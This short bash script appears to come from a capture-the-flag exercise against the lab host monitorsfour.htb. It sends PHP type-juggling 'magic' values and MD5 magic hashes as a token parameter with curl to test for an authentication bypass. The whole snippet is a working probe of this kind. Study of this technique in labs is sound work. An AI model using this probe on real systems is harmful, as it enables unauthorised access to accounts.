# Test with "magic" values that equal 0 in loose comparison
magic_values=("0" "0e0" "0e1" "0e12345" "00" "0x0" "0.0" "0 " " 0")

for value in "${magic_values[@]}"; do
  echo -n "Testing token=$value -> "
  curl -s "http://monitorsfour.htb/user?token=$value" | jq -r '.error // "SUCCESS!"'
done

# Also try common "magic hashes"
# MD5 hashes that start with "0e" and contain only digits after
magic_hashes=(
  "0e215962017"
  "0e462097431906509019562988736854"
  "0e1137126905"
  "0e291242476940776845150308577824"
  "0e656258624"
)

for hash in "${magic_hashes[@]}"; do
  echo -n "Testing MD5 magic hash: $hash -> "
  curl -s "http://monitorsfour.htb/user?token=$hash" | jq -r '.error // "SUCCESS!"'
done
